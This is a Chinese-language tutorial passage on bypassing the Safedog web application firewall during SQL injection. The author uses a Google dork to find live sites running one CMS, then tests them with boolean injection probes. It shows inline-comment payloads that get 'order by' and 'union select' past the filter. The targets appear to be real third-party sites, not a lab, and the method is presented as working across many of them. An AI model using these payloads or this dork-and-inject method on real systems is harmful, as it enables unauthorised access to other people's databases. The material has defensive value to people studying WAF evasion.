# 五:Bypass的案例:

* * *

# 

这些案例是我之前找的注入点,过了几个月发现有技术支持,然后url基本一样,就发现的通杀。  
这里先说一下payload:

`/*!60000asd*/            WAF过滤哪些关键词就写在哪些中间,例如:order/*!60000sad*/by 1 或 系统函数:user/**/() 或 database/**/(),等`

这里再解释一下Payload:

```

```

## 安全狗:

谷歌语法:

```
inurl:about.php?
```

![](../Images/0349b2589a7b35edd54c8f9d4d691571.png)

找到很多同一CMS的站点,开始注入。

![](../Images/9a06c60d29b496675b4c057f72334ce0.png)

进去以后正常页面。

添加单引号:

![](../Images/6ea6e2140d36c1e0d9d7096346612f97.png)

`and 1=1                 拦截`  
`and -1=-1                 不拦截`  
`and 1=2                        拦截`  
`and -1=-2                不拦截`

报错存在注入,既然确定存在注入,就直接order by。

![](../Images/acde3ea0cea5c41f814ecc259464e9fa.png)

存在WAF,安全狗,利用上面我提到的语句来绕过。

`order/*!60000asd*/by 字段数 limit 1,1`

![](../Images/1a05aeb545e961d6750527695dfe9166.png)

成功绕过。

下面联合查询,union select。

![](../Images/f918486ac83cca617d300c97f0e35af8.png)

正常写联合查询被拦截。  

还是用上面提到的Payload来绕过。

union/\*!60000asd\*/select 1,2,3,4 limit 1,1

  

![](../Images/396f5ea85d37af2edb8a5f6f97250d39.png)

成功绕过,系统函数也是同样的道理绕过。
